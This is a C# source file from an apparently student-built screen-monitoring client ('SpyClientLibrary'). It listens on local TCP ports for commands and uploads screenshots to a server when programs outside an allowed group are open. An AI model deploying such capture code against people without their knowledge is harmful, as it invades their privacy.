using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SpyClientLibrary.ServiceReference;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;


namespace SpyClientLibrary
{
    public class Control
    {
        public TaskManager _taskmanager { get; set; }
        public User _user { get; set; }
        private int _acceptablepagesgroupid;
        public Control()
        {

        }
        public void StartControl()
        {
            Console.WriteLine("Start working");
            GetCmd();
            Thread ThredScreen = new Thread(new ThreadStart(WaitForScreenCMD));
            ThredScreen.Start();

            _user = new User();
            _taskmanager = new TaskManager(_acceptablepagesgroupid);
            while(true)
            {
                if (!_taskmanager.CheckOpenPrograms())
                {
                    ScreenShot screen = new ScreenShot(_user);
                    screen.GenerateCurrentScreen();
                    SendScreen(screen);
                }
            }
        }

        public void WaitForScreenCMD()
        {
            while (true)
            {
                IPAddress ipAd = IPAddress.Parse("192.168.43.107");
                TcpListener myList = new TcpListener(ipAd, 8002);
                myList.Start();

                byte[] b = new byte[100];
                Socket s = myList.AcceptSocket();
                int k = s.Receive(b);
                for (int i = 0; i < k; i++)
                    Console.Write(Convert.ToChar(b[i]));

                ScreenShot screen = new ScreenShot(_user);
                var id = SendScreen(screen);
                ASCIIEncoding asen = new ASCIIEncoding();
                s.Send(asen.GetBytes(id.ToString()));
                s.Close();
                myList.Stop();
            }
        }
        private void GetCmd()
        {
            IPAddress ipAd = IPAddress.Parse("192.168.43.107");
            TcpListener myList = new TcpListener(ipAd, 8001);
            myList.Start();

            byte[] b = new byte[100];
            Socket s = myList.AcceptSocket();
            int k = s.Receive(b);
            bool read = false;
            string id = "";
            for (int i = 0; i < k; i++)
            {
                if (read == true)
                    id += Convert.ToChar(b[i]);
                if (Convert.ToChar(b[i]) == '|')
                {
                    read = true;
                }
                Console.Write(Convert.ToChar(b[i]));
            }
            _acceptablepagesgroupid = Convert.ToInt32(id);
            ASCIIEncoding asen = new ASCIIEncoding();
            s.Send(asen.GetBytes("StartACK"));
            s.Close();
            myList.Stop();
        } 

        public int SendScreen(ScreenShot screen)
        {
            int id;
            using (ClientServiceClient client = new ClientServiceClient())
            {                
                screen.GenerateCurrentScreen();
                id = client.SaveScreenShotToDB(
                        new ClientRequest()
                        {
                            _username = screen._user._userName,
                            _scrrenDate = screen._scrrenDate,
                            _scrrenName = screen._screenName,
                            _data = screen._data
                        });
            }
            return id;
        }
    }
}
